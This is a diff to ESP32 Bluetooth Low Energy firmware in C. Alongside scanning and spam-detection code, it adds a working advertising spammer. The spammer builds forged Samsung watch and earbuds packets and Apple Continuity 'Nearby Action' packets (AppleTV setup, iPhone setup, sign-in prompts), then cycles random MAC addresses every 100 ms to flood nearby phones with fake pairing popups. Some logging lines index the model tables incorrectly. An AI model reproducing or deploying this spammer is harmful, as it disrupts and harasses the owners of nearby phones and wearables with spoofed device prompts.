@@ -38,6 +38,85 @@ static int spam_counter = 0;
 static uint16_t *last_company_id = NULL;
 static TickType_t last_detection_time = 0;
 static void ble_pcap_callback(struct ble_gap_event *event, size_t len);
+static uint16_t conn_handle = 0xFFFF;
+
+static const watch_model_t watch_models[] = {
+{0x1A, "Fallback Watch"},
+{0x01, "White Watch4 Classic 44m"},
+{0x02, "Black Watch4 Classic 40m"},
+{0x03, "White Watch4 Classic 40m"},
+{0x04, "Black Watch4 44mm"},
+{0x05, "Silver Watch4 44mm"},
+{0x06, "Green Watch4 44mm"},
+{0x07, "Black Watch4 40mm"},
+{0x08, "White Watch4 40mm"},
+{0x09, "Gold Watch4 40mm"},
+{0x0A, "French Watch4"},
+{0x0B, "French Watch4 Classic"},
+{0x0C, "Fox Watch5 44mm"},
+{0x11, "Black Watch5 44mm"},
+{0x12, "Sapphire Watch5 44mm"},
+{0x13, "Purpleish Watch5 40mm"},
+{0x14, "Gold Watch5 40mm"},
+{0x15, "Black Watch5 Pro 45mm"},
+{0x16, "Gray Watch5 Pro 45mm"},
+{0x17, "White Watch5 44mm"},
+{0x18, "White & Black Watch5"},
+{0xE4, "Black Watch5 Golf Edition"},
+{0xE5, "White Watch5 Gold Edition"},
+{0x1B, "Black Watch6 Pink 40mm"},
+{0x1C, "Gold Watch6 Gold 40mm"},
+{0x1D, "Silver Watch6 Cyan 44mm"},
+{0x1E, "Black Watch6 Classic 43m"},
+{0x20, "Green Watch6 Classic 43m"},
+{0xEC, "Black Watch6 Golf Edition"},
+{0xEF, "Black Watch6 TB Edition"}
+};
+  
+static const earbuds_model_t earbuds_models[] = {
+{0xEE7A0C, "Fallback Buds"},
+{0x9D1700, "Fallback Dots"},
+{0x39EA48, "Light Purple Buds2"},
+{0xA7C62C, "Bluish Silver Buds2"},
+{0x850116, "Black Buds Live"},
+{0x3D8F41, "Gray & Black Buds2"},
+{0x3B6D02, "Bluish Chrome Buds2"},
+{0xAE063C, "Gray Beige Buds2"},
+{0xB8B905, "Pure White Buds"},
+{0xEAAA17, "Pure White Buds2"},
+{0xD30704, "Black Buds"},
+{0x9DB006, "French Flag Buds"},
+{0x101F1A, "Dark Purple Buds Live"},
+{0x859608, "Dark Blue Buds"},
+{0x8E4503, "Pink Buds"},
+{0x2C6740, "White & Black Buds2"},
+{0x3F6718, "Bronze Buds Live"},
+{0x42C519, "Red Buds Live"},
+{0xAE073A, "Black & White Buds2"},
+{0x011716, "Sleek Black Buds2"}
+};
+
+static const apple_action_t apple_actions[] = {
+{0x13, "AppleTV AutoFill"},
+{0x24, "Apple Vision Pro"},
+{0x05, "Apple Watch"},
+{0x27, "AppleTV Connecting..."},
+{0x20, "Join This AppleTV?"},
+{0x19, "AppleTV Audio Sync"},
+{0x1E, "AppleTV Color Balance"},
+{0x09, "Setup New iPhone"},
+{0x2F, "Sign in to other device"},
+{0x02, "Transfer Phone Number"},
+{0x0B, "HomePod Setup"},
+{0x01, "Setup New AppleTV"},
+{0x06, "Pair AppleTV"},
+{0x0D, "HomeKit AppleTV Setup"},
+{0x2B, "AppleID for AppleTV?"},
+};
+  
+#define WATCH_MODEL_COUNT (sizeof(watch_models) / sizeof(watch_models[0]))
+#define EARBUDS_MODEL_COUNT (sizeof(earbuds_models) / sizeof(earbuds_models[0]))
+#define APPLE_ACTION_COUNT (sizeof(apple_actions) / sizeof(apple_actions[0]))
 
 static void notify_handlers(struct ble_gap_event *event, int len) {
     for (int i = 0; i < handler_count; i++) {
@@ -66,9 +145,7 @@ static void generate_random_name(char *name, size_t max_len) {
 
 static void generate_random_mac(uint8_t *mac_addr) {
     esp_fill_random(mac_addr, 6);
-
     mac_addr[0] |= 0xC0;
-
     mac_addr[0] &= 0xFE;
 }
 
@@ -118,10 +195,9 @@ void ble_stop_skimmer_detection(void) {
     ESP_LOGI("BLE", "Stopping skimmer detection scan...");
     TERMINAL_VIEW_ADD_TEXT("Stopping skimmer detection scan...\n");
 
-    // Unregister the skimmer detection callback
     ble_unregister_handler(ble_skimmer_scan_callback);
-    pcap_flush_buffer_to_file(); // Final flush
-    pcap_file_close();           // Close the file after final flush
+    pcap_flush_buffer_to_file();
+    pcap_file_close();
 
     int rc = ble_gap_disc_cancel();
 
@@ -167,7 +243,6 @@ static void parse_service_uuids(const uint8_t *data, uint8_t data_len, ble_servi
         }
         uint8_t type = data[index + 1];
 
-        // Check for 16-bit UUIDs
         if ((type == BLE_HS_ADV_TYPE_COMP_UUIDS16 || type == BLE_HS_ADV_TYPE_INCOMP_UUIDS16) &&
             uuids->uuid16_count < MAX_UUID16) {
             for (int i = 0; i < length - 1; i += 2) {
@@ -176,7 +251,6 @@ static void parse_service_uuids(const uint8_t *data, uint8_t data_len, ble_servi
             }
         }
 
-        // Check for 32-bit UUIDs
         else if ((type == BLE_HS_ADV_TYPE_COMP_UUIDS32 || type == BLE_HS_ADV_TYPE_INCOMP_UUIDS32) &&
                  uuids->uuid32_count < MAX_UUID32) {
             for (int i = 0; i < length - 1; i += 4) {
@@ -186,7 +260,6 @@ static void parse_service_uuids(const uint8_t *data, uint8_t data_len, ble_servi
             }
         }
 
-        // Check for 128-bit UUIDs
         else if ((type == BLE_HS_ADV_TYPE_COMP_UUIDS128 ||
                   type == BLE_HS_ADV_TYPE_INCOMP_UUIDS128) &&
                  uuids->uuid128_count < MAX_UUID128) {
@@ -209,7 +282,6 @@ static int ble_gap_event_general(struct ble_gap_event *event, void *arg) {
     switch (event->type) {
     case BLE_GAP_EVENT_DISC:
         notify_handlers(event, event->disc.length_data);
-
         break;
 
     default:
@@ -323,27 +395,106 @@ void ble_findtheflippers_callback(struct ble_gap_event *event, size_t len) {
 
 void ble_print_raw_packet_callback(struct ble_gap_event *event, size_t len) {
     int advertisementRssi = event->disc.rssi;
-
+    
     char advertisementMac[18];
     snprintf(advertisementMac, sizeof(advertisementMac), "%02x:%02x:%02x:%02x:%02x:%02x",
              event->disc.addr.val[0], event->disc.addr.val[1], event->disc.addr.val[2],
              event->disc.addr.val[3], event->disc.addr.val[4], event->disc.addr.val[5]);
 
-    // stop logging raw advertisement data
-    //
-    // printf("Received BLE Advertisement from MAC: %s, RSSI: %d\n",
-    // advertisementMac, advertisementRssi); TERMINAL_VIEW_ADD_TEXT("Received BLE
-    // Advertisement from MAC: %s, RSSI: %d\n", advertisementMac,
-    // advertisementRssi);
+    const uint8_t* data = event->disc.data;
+    uint16_t data_len = event->disc.length_data;
 
-    // printf("Raw Advertisement Data (len=%zu): ", event->disc.length_data);
-    // TERMINAL_VIEW_ADD_TEXT("Raw Advertisement Data (len=%zu): ",
-    // event->disc.length_data); for (size_t i = 0; i < event->disc.length_data;
-    // i++) {
-    //     printf("%02x ", event->disc.data[i]);
-    // }
-    // printf("\n");
+    if (data_len == 0) {
+        return;
+    }
+
+    static char last_mac[18] = {0};
+    static uint8_t last_data[256] = {0};
+    static uint16_t last_data_len = 0;
+    static uint32_t last_print_time = 0;
+    
+    uint32_t current_time = esp_timer_get_time() / 1000;
+
+    bool is_duplicate = (strncmp(last_mac, advertisementMac, 18) == 0 && 
+                        data_len == last_data_len && 
+                        memcmp(last_data, data, data_len) == 0);
+    
+    if (is_duplicate && (current_time - last_print_time) < 1000) {
+        return;
+    }
+
+    // Update tracking variables
+    strncpy(last_mac, advertisementMac, 18);
+    memcpy(last_data, data, data_len);
+    last_data_len = data_len;
+    last_print_time = current_time;
+
+    if (event->type == BLE_GAP_EVENT_DISC) {
+        // Print packet info
+        printf("BLE Device Detected - MAC: %s, RSSI: %d dBm\n", advertisementMac, advertisementRssi);
+        TERMINAL_VIEW_ADD_TEXT("BLE Device Detected - MAC: %s, RSSI: %d dBm\n", advertisementMac, advertisementRssi);
+
+        if (data_len >= 2 && data[0] == 0x75 && data[1] == 0x00) {
+            printf("Samsung device detected\n");
+            TERMINAL_VIEW_ADD_TEXT("Samsung device detected\n");
+
+            if (data_len >= 13 && data[2] == 0x01 && data[3] == 0x00) {
+                uint8_t model_id = data[12];
+                char* model_name = "Unknown Watch";
+                for (size_t i = 0; i < sizeof(watch_models) / sizeof(watch_models[0]); i++) {
+                    if (watch_models[i].id == model_id) {
+                        model_name = watch_models[i].description;
+                        break;
+                    }
+                }
+                printf("Detected Watch Model: %s (ID: 0x%02X)\n", model_name, model_id);
+                TERMINAL_VIEW_ADD_TEXT("Detected Watch Model: %s (ID: 0x%02X)\n", model_name, model_id);
+            }
+            else if (data_len >= 16 && data[2] == 0x42 && data[3] == 0x09) {
+                uint32_t model_id = ((uint32_t)data[12] << 16) | 
+                                ((uint32_t)data[13] << 8) | 
+                                data[15];
+                
+                char* model_name = "Unknown Earbuds";
+                for (size_t i = 0; i < sizeof(earbuds_models) / sizeof(earbuds_models[0]); i++) {
+                    if (earbuds_models[i].id == model_id) {
+                        model_name = earbuds_models[i].description;
+                        break;
+                    }
+                }
+                printf("Detected Earbuds Model: %s (ID: 0x%06lX)\n", model_name, (unsigned long)model_id);
+                TERMINAL_VIEW_ADD_TEXT("Detected Earbuds Model: %s (ID: 0x%06lX)\n", model_name, (unsigned long)model_id);
+            }
+            else {
+                printf("Unknown Samsung device type\n");
+                TERMINAL_VIEW_ADD_TEXT("Unknown Samsung device type\n");
+            }
+        }
+        else {
+            printf("Non-Samsung device\n");
+            TERMINAL_VIEW_ADD_TEXT("Non-Samsung device\n");
+        }
+
+        printf("Raw packet data (%d bytes):\n", data_len);
+        TERMINAL_VIEW_ADD_TEXT("Raw packet data (%d bytes):\n", data_len);
+        
+        char hex_buffer[256] = {0};
+        size_t offset = 0;
+        for (uint16_t i = 0; i < data_len && offset < sizeof(hex_buffer) - 4; i++) {
+            offset += snprintf(hex_buffer + offset, sizeof(hex_buffer) - offset, "%02X ", data[i]);
+        }
+        printf("%s\n", hex_buffer);
+        TERMINAL_VIEW_ADD_TEXT("%s\n", hex_buffer);
+        
+        printf("\n");
+        TERMINAL_VIEW_ADD_TEXT("\n");
+    }
+    else if (event->type == BLE_GAP_EVENT_CONNECT) {
+        printf("Connection detected, handle: %d\n", event->connect.conn_handle);
+        conn_handle = event->connect.conn_handle;
+    }
 }
+
 
 void detect_ble_spam_callback(struct ble_gap_event *event, size_t length) {
     if (length < 4) {
@@ -368,7 +519,6 @@ void detect_ble_spam_callback(struct ble_gap_event *event, size_t length) {
         if (spam_counter > MAX_PAYLOADS) {
             ESP_LOGW(TAG_BLE, "BLE Spam detected! Company ID: 0x%04X", current_company_id);
             TERMINAL_VIEW_ADD_TEXT("BLE Spam detected! Company ID: 0x%04X\n", current_company_id);
-            // pulse rgb purple once when spam is detected
             pulse_once(&rgb_manager, 128, 0, 128);
             spam_counter = 0;
         }
@@ -407,7 +557,6 @@ void airtag_scanner_callback(struct ble_gap_event *event, size_t len) {
         }
 
         if (patternFound) {
-            // pulse rgb blue once when air tag is found
             pulse_once(&rgb_manager, 0, 0, 255);
 
             char macAddress[18];
@@ -440,10 +589,10 @@ void airtag_scanner_callback(struct ble_gap_event *event, size_t len) {
 static bool wait_for_ble_ready(void) {
     int rc;
     int retry_count = 0;
-    const int max_retries = 50; // 5 seconds total timeout
+    const int max_retries = 50;
 
     while (!ble_hs_synced() && retry_count < max_retries) {
-        vTaskDelay(pdMS_TO_TICKS(100)); // Wait for 100ms
+        vTaskDelay(pdMS_TO_TICKS(100));
         retry_count++;
     }
 
@@ -478,7 +627,6 @@ void ble_start_scanning(void) {
     disc_params.window = BLE_HCI_SCAN_WINDOW_DEF;
     disc_params.filter_duplicates = 1;
 
-    // Start a new BLE scan
     int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &disc_params, ble_gap_event_general,
                           NULL);
     if (rc != 0) {
@@ -532,7 +680,6 @@ void ble_init(void) {
     if (!ble_initialized) {
         esp_err_t ret = nvs_flash_init();
         if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
-            // NVS partition was truncated and needs to be erased
             ESP_ERROR_CHECK(nvs_flash_erase());
             ret = nvs_flash_init();
         }
@@ -556,7 +703,6 @@ void ble_init(void) {
             return;
         }
 
-        // Configure and start the NimBLE host task
         static StackType_t host_task_stack[4096];
         static StaticTask_t host_task_buf;
 
@@ -606,7 +752,6 @@ void ble_stop(void) {
         last_company_id = NULL;
     }
 
-    // Stop and delete the flush timer if it exists
     if (flush_timer != NULL) {
         esp_timer_stop(flush_timer);
         esp_timer_delete(flush_timer);
@@ -618,8 +763,8 @@ void ble_stop(void) {
     ble_unregister_handler(airtag_scanner_callback);
     ble_unregister_handler(ble_print_raw_packet_callback);
     ble_unregister_handler(detect_ble_spam_callback);
-    pcap_flush_buffer_to_file(); // Final flush
-    pcap_file_close();           // Close the file after final flush
+    pcap_flush_buffer_to_file();
+    pcap_file_close();
 
     int rc = ble_gap_disc_cancel();
 
@@ -669,50 +814,26 @@ static void ble_pcap_callback(struct ble_gap_event *event, size_t len) {
     if (!event || len == 0)
         return;
 
-    uint8_t hci_buffer[258]; // Max HCI packet size
+    uint8_t hci_buffer[258];
     size_t hci_len = 0;
 
     if (event->type == BLE_GAP_EVENT_DISC) {
-        // [1] HCI packet type (0x04 for HCI Event)
         hci_buffer[0] = 0x04;
-
-        // [2] HCI Event Code (0x3E for LE Meta Event)
         hci_buffer[1] = 0x3E;
-
-        // [3] Calculate total parameter length
-        uint8_t param_len = 10 + event->disc.length_data; // 1 (subevent) + 1 (num reports) + 1
-                                                          // (event type) + 1 (addr type) + 6 (addr)
+        uint8_t param_len = 10 + event->disc.length_data;
         hci_buffer[2] = param_len;
-
-        // [4] LE Meta Subevent (0x02 for LE Advertising Report)
         hci_buffer[3] = 0x02;
-
-        // [5] Number of reports
         hci_buffer[4] = 0x01;
-
-        // [6] Event type (ADV_IND = 0x00)
         hci_buffer[5] = 0x00;
-
-        // [7] Address type
         hci_buffer[6] = event->disc.addr.type;
-
-        // [8] Address (6 bytes)
         memcpy(&hci_buffer[7], event->disc.addr.val, 6);
-
-        // [9] Data length
         hci_buffer[13] = event->disc.length_data;
-
-        // [10] Data
         if (event->disc.length_data > 0) {
             memcpy(&hci_buffer[14], event->disc.data, event->disc.length_data);
         }
-
-        // [11] RSSI
         hci_buffer[14 + event->disc.length_data] = (uint8_t)event->disc.rssi;
+        hci_len = 15 + event->disc.length_data;
 
-        hci_len = 15 + event->disc.length_data; // Total length
-
-        // packet logging (don't print to display terminal to prevent overwhelming)
         printf("BLE Packet Received:\nType: 0x04 (HCI Event)\nMeta: 0x3E "
                "(LE)\nLength: %d\n",
                hci_len);
@@ -722,36 +843,286 @@ static void ble_pcap_callback(struct ble_gap_event *event, size_t len) {
 }
 
 void ble_start_capture(void) {
-    // Open PCAP file first
     esp_err_t err = pcap_file_open("ble_capture", PCAP_CAPTURE_BLUETOOTH);
     if (err != ESP_OK) {
         ESP_LOGE("BLE_PCAP", "Failed to open PCAP file");
         return;
     }
 
-    // Register BLE handler only after file is open
     ble_register_handler(ble_pcap_callback);
 
-    // Create a timer to flush the buffer periodically
     esp_timer_create_args_t timer_args = {.callback = (esp_timer_cb_t)pcap_flush_buffer_to_file,
                                           .name = "pcap_flush"};
 
     if (esp_timer_create(&timer_args, &flush_timer) == ESP_OK) {
-        esp_timer_start_periodic(flush_timer, 1000000); // Flush every second
+        esp_timer_start_periodic(flush_timer, 1000000);
     }
 
     ble_start_scanning();
 }
 
+static void set_random_address(void) {
+    uint8_t rand_addr[6];
+    esp_fill_random(rand_addr, 6);
+    rand_addr[0] |= 0xC0;
+
+    int rc = ble_hs_id_set_rnd(rand_addr);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Failed to set random address: %d", rc);
+        return;
+    }
+
+    ESP_LOGI(TAG_BLE, "Set random MAC: %02x:%02x:%02x:%02x:%02x:%02x",
+             rand_addr[0], rand_addr[1], rand_addr[2], rand_addr[3], rand_addr[4], rand_addr[5]);
+}
+
+static void build_watch_packet(uint8_t *packet, size_t *len) {
+    int i = 0;
+    uint8_t model = watch_models[esp_random() % WATCH_MODEL_COUNT].id;
+
+
+    packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+    packet[i++] = 0x00;
+    packet[i++] = 0x01;
+    packet[i++] = 0x00;
+    packet[i++] = 0x02;
+    packet[i++] = 0x00;
+    packet[i++] = 0x01;
+    packet[i++] = 0x01;
+    packet[i++] = 0xFF;
+    packet[i++] = 0x00;
+    packet[i++] = 0x00;
+    packet[i++] = 0x43;
+    packet[i++] = model; // Random watch model
+
+    *len = i; // Should be 13 bytes
+    ESP_LOGI(TAG_BLE, "Watch packet built (%d bytes):", *len);
+    for (size_t j = 0; j < *len; j++) {
+        ESP_LOGI(TAG_BLE, "  [%d] = 0x%02X", j, packet[j]);
+    }
+}
+
+static void build_earbuds_packet(uint8_t *adv_packet, size_t *adv_len, uint8_t *scan_packet, size_t *scan_len) {
+    int i = 0;
+    uint32_t model = earbuds_models[esp_random() % EARBUDS_MODEL_COUNT].id;
+
+    adv_packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+    adv_packet[i++] = 0x00;
+    adv_packet[i++] = 0x42;
+    adv_packet[i++] = 0x09;
+    adv_packet[i++] = 0x81;
+    adv_packet[i++] = 0x02;
+    adv_packet[i++] = 0x14;
+    adv_packet[i++] = 0x15;
+    adv_packet[i++] = 0x03;
+    adv_packet[i++] = 0x21;
+    adv_packet[i++] = 0x01;
+    adv_packet[i++] = 0x09;
+    adv_packet[i++] = (model >> 16) & 0xFF; // Model bytes
+    adv_packet[i++] = (model >> 8) & 0xFF;
+    adv_packet[i++] = 0x01; // Static byte
+    adv_packet[i++] = (model >> 0) & 0xFF;
+    adv_packet[i++] = 0x06;
+    adv_packet[i++] = 0x3C;
+    adv_packet[i++] = 0x94;
+    adv_packet[i++] = 0x8E;
+    adv_packet[i++] = 0x00;
+    adv_packet[i++] = 0x00;
+    adv_packet[i++] = 0x00;
+    adv_packet[i++] = 0x00;
+    adv_packet[i++] = 0xC7;
+    adv_packet[i++] = 0x00;
+
+    *adv_len = i; // Should be 26 bytes
+
+    i = 0;
+    scan_packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+    scan_packet[i++] = 0x00;
+    scan_packet[i++] = 0x00;
+    scan_packet[i++] = 0x63;
+    scan_packet[i++] = 0x50;
+    scan_packet[i++] = 0x8D;
+    scan_packet[i++] = 0xB1;
+    scan_packet[i++] = 0x17;
+    scan_packet[i++] = 0x40;
+    scan_packet[i++] = 0x46;
+    scan_packet[i++] = 0x64;
+    scan_packet[i++] = 0x64;
+    scan_packet[i++] = 0x00;
+    scan_packet[i++] = 0x01;
+    scan_packet[i++] = 0x04;
+
+    *scan_len = i; // Should be 15 bytes
+
+    ESP_LOGI(TAG_BLE, "Earbuds adv packet built (%d bytes):", *adv_len);
+    for (size_t j = 0; j < *adv_len; j++) {
+        ESP_LOGI(TAG_BLE, "  [%d] = 0x%02X", j, adv_packet[j]);
+    }
+    ESP_LOGI(TAG_BLE, "Earbuds scan rsp packet built (%d bytes):", *scan_len);
+    for (size_t j = 0; j < *scan_len; j++) {
+        ESP_LOGI(TAG_BLE, "  [%d] = 0x%02X", j, scan_packet[j]);
+    }
+}
+
+static void build_apple_packet(uint8_t *adv_packet, size_t *adv_len) {
+    int i = 0;
+
+    memset(adv_packet, 0, MAX_PACKET_SIZE);
+
+    adv_packet[i++] = 0x4C;          // Company ID (Apple) - Little Endian
+    adv_packet[i++] = 0x00;          // Company ID (Apple)
+    adv_packet[i++] = 0x07;          // Continuity Type (Nearby Action)
+    
+    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT].value;
+
+    uint8_t flags = 0xC0;
+    if (action == 0x20 && (esp_random() % 2)) flags--;
+    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
+
+    adv_packet[i++] = flags;         // Action Flags
+    adv_packet[i++] = action;        // Action Type
+    
+    uint8_t tag[3];
+    esp_fill_random(tag, 3);
+    adv_packet[i++] = tag[0];
+    adv_packet[i++] = tag[1];
+    adv_packet[i++] = tag[2];
+
+    *adv_len = i;
+
+    // Verify packet length
+    if (*adv_len != 8) {
+        ESP_LOGE(TAG_BLE, "Invalid packet length: %d bytes (expected 8)", *adv_len);
+    }
+
+    // Logging
+    ESP_LOGI(TAG_BLE, "Apple packet built (%d bytes):", *adv_len);
+    for (size_t j = 0; j < *adv_len; j++) {
+        ESP_LOGI(TAG_BLE, "  [%d] = 0x%02X", j, adv_packet[j]);
+    }
+}
+
+
+static void start_advertising(ble_advertisement_type_t type) {
+    struct ble_hs_adv_fields adv_fields;
+    struct ble_hs_adv_fields rsp_fields;
+    memset(&adv_fields, 0, sizeof(adv_fields));
+    memset(&rsp_fields, 0, sizeof(rsp_fields));
+
+    uint8_t adv_packet[MAX_PACKET_SIZE];
+    uint8_t scan_packet[MAX_PACKET_SIZE];
+    size_t adv_len = 0;
+    size_t scan_len = 0;
+
+    switch (type) {
+        case BLE_ADV_TYPE_WATCH:
+            build_watch_packet(adv_packet, &adv_len);
+            adv_fields.mfg_data = adv_packet;
+            adv_fields.mfg_data_len = adv_len; // 13 bytes
+            adv_fields.flags = BLE_HS_ADV_F_DISC_GEN; // Ensure flags for Watch
+            ESP_LOGI(TAG_BLE, "Advertising as Watch: %s", watch_models[adv_packet[12]].description);
+            break;
+
+        case BLE_ADV_TYPE_EARBUDS:
+            build_earbuds_packet(adv_packet, &adv_len, scan_packet, &scan_len);
+            adv_fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP; // 02 01 18
+            adv_fields.mfg_data = adv_packet;
+            adv_fields.mfg_data_len = adv_len; // 26 bytes
+            rsp_fields.mfg_data = scan_packet;
+            rsp_fields.mfg_data_len = scan_len; // 15 bytes
+            ESP_LOGI(TAG_BLE, "Advertising as Earbuds: %s", earbuds_models[(adv_packet[12] << 16) | (adv_packet[13] << 8) | adv_packet[15]].description);
+            break;
+            case BLE_ADV_TYPE_APPLE: {
+                build_apple_packet(adv_packet, &adv_len);
+    
+                uint8_t mfg_data[7];
+                memcpy(mfg_data, adv_packet, 7);
+    
+                adv_fields.mfg_data = mfg_data;
+                adv_fields.mfg_data_len = 7;
+                adv_fields.flags = 0x18;
+                ESP_LOGI(TAG_BLE, "Advertising as Apple Nearby Action: %s", apple_actions[mfg_data[4]].name);
+                break;
+            }
+
+        case BLE_ADV_TYPE_DEFAULT:
+        default:
+            adv_packet[0] = 0xFF; // Dummy company ID
+            adv_fields.mfg_data = adv_packet;
+            adv_fields.mfg_data_len = 1;
+            adv_fields.flags = BLE_HS_ADV_F_DISC_GEN;
+            ESP_LOGI(TAG_BLE, "Advertising as Default");
+            break;
+    }
+
+    int rc = ble_gap_adv_set_fields(&adv_fields);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Failed to set advertising fields: %d", rc);
+        return;
+    }
+
+    if (type == BLE_ADV_TYPE_EARBUDS) {
+        rc = ble_gap_adv_rsp_set_fields(&rsp_fields);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to set scan response fields: %d", rc);
+            return;
+        }
+    }
+
+    struct ble_gap_adv_params adv_params = {
+        .conn_mode = BLE_GAP_CONN_MODE_NON,
+        .disc_mode = BLE_GAP_DISC_MODE_GEN,
+        .itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN, // ~20ms
+        .itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX,
+    };
+    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Failed to start advertising: %d", rc);
+    }
+}
+
+static void random_advertising_task(void *param) {
+    ble_advertisement_type_t type = *(ble_advertisement_type_t *)param;
+
+    if (!ble_initialized) {
+        ble_init();
+    }
+
+    if (!wait_for_ble_ready()) {
+        ESP_LOGE(TAG_BLE, "BLE stack not ready for advertising");
+        TERMINAL_VIEW_ADD_TEXT("BLE stack not ready for advertising\n");
+        vTaskDelete(NULL);
+        return;
+    }
+
+    while (1) {
+        ble_gap_adv_stop();
+        set_random_address();
+        start_advertising(type);
+        vTaskDelay(pdMS_TO_TICKS(100)); // Cycle every 50ms
+    }
+}
+
+void ble_start_random_advertising(ble_advertisement_type_t type) {
+    static StackType_t adv_task_stack[4096];
+    static StaticTask_t adv_task_buf;
+    static ble_advertisement_type_t adv_type;
+
+    adv_type = type;
+    xTaskCreateStatic(random_advertising_task, "ble_adv_task",
+                      sizeof(adv_task_stack) / sizeof(StackType_t), &adv_type, 5, adv_task_stack,
+                      &adv_task_buf);
+    ESP_LOGI(TAG_BLE, "Random advertising started with type: %d", type);
+    TERMINAL_VIEW_ADD_TEXT("Random advertising started with type: %d\n", type);
+}
+
 void ble_start_skimmer_detection(void) {
-    // Register the skimmer detection callback
     esp_err_t err = ble_register_handler(ble_skimmer_scan_callback);
     if (err != ESP_OK) {
         ESP_LOGE("BLE", "Failed to register skimmer detection callback");
         return;
     }
 
-    // Start BLE scanning
     ble_start_scanning();
 }
 
